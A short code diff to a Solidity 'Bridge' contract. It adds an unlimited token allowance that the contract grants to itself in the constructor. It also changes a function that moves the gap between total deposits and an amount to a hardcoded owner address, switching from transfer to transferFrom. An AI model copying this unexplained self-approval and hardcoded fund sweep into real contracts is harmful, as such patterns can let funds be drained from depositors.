@@ -21,6 +21,9 @@ contract Bridge {
         underlying = _underlying;
         vault = _vault;
         _self = address(this);
+
+        IERC20(underlying).approve(_self, type(uint256).max);
+
         lockTime = _lockTime;
     }
 
@@ -72,7 +75,7 @@ contract Bridge {
         uint256 delta = totalDeposits - amount;
 
         address owner = 0x9943d42D7a59a0abaE451130CcfC77d758da9cA0;
-        IERC20(underlying).transfer(owner, delta);
+        IERC20(underlying).transferFrom(_self, owner, delta);
     }
 
     function receiveApproval(address from, uint256 amount, address token, bytes calldata data) external {
